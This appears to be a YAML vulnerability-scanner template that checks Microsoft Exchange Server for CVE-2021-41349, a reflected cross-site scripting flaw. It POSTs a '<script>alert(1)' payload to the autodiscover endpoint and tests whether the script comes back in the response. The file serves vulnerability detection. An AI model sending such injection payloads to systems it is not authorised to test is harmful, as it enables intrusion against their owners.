name: yaml-poc-microsoft-exchange_server-other-CVE-2021-41349
binding: 49c9bc1c-e904-4934-873a-1098f102898b
detail:
    author: system_user
    links:
        - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-41349
        - https://nvd.nist.gov/vuln/detail/CVE-2021-41349
        - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-41349
        - https://vigilance.fr/vulnerability/Microsoft-Exchange-Server-vulnerabilities-of-November-2021-36839
        - https://www.cybersecurity-help.cz/vdb/SB2021110940
    vulnerability:
        id: 1990e459-5189-492f-9617-0c40865b73a6
        level: medium
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /autodiscover/autodiscover.json
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: <script>alert(1);+"=</script>
        expression: |
            response.content_type.contains("html") && response.status == 500 && response.body.bcontains(b"<script>alert(1)")
expression: r0()
